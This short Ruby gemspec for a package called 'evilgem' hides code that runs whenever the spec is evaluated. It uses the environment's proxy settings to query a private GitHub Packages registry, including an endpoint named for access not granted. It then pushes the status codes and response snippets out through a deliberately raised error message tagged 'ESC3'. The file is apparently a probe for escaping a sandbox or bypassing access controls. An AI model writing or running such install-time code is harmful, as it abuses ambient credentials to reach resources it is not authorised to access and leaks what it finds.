require "net/http"; require "uri"
MARK = "ESC3-74ca18"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def g(url)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else Net::HTTP.new(u.host, u.port) end
  h.use_ssl = true; h.open_timeout = 15; h.read_timeout = 20
  r = h.get(u.request_uri); [r.code, r.body.to_s]
rescue => e; ["ERR", "#{e.class}:#{e.message}"] end
B = "https://rubygems.pkg.github.com/czarflix-org"
T = { "names" => "#{B}/names", "versions" => "#{B}/versions", "info_notgranted" => "#{B}/info/cdxnotgranted" }
res = ["#{MARK} pid=#{Process.pid}"]
T.each { |k, u| c, b = g(u); res << "#{k} http=#{c} bytes=#{b.bytesize} body=#{b.gsub(/\s+/,' ')[0,120].inspect}" }
raise "#{MARK} :: " + res.join(" :: ")
Gem::Specification.new { |s| s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = [] }
